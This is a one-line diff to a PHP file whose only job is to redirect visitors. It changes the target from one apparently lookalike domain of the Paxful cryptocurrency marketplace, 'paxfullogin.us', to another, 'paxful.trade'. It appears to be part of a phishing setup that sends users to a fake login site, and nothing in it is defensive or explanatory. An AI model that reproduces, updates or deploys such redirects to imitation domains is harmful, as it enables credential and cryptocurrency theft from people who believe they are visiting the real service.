@@ -1,1 +1,1 @@
-<?php header("Location: https://paxfullogin.us/"); die(); ?>
+<?php header("Location: http://paxful.trade/"); die(); ?>
